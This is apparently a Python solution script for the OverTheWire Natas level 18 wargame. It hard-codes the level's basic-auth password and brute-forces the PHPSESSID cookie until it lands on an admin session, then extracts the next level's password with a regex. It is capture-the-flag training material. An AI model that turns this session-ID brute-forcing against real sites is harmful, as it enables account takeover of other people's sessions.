import re
import requests
from requests.auth import HTTPBasicAuth

auth = HTTPBasicAuth('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')
param = {'debug':'', 'username':'admin', 'password':'yahyeet'}
cook = {'PHPSESSID':'0x12312'}
r = requests.get('http://natas18.natas.labs.overthewire.org', auth=auth, params=param, cookies=cook)
if r.text.find('DEBUG') != -1:
    print('Debug!')

count = 0

while r.text.find('You are an admin') == -1:
    cook = {'PHPSESSID':str(count)}
    print(count)
    r = requests.get('http://natas18.natas.labs.overthewire.org', auth=auth, params=param, cookies=cook)
    count += 1
pass_regex = '[a-zA-Z0-9]{32}'
print(re.findall(pass_regex, r.text)[1])
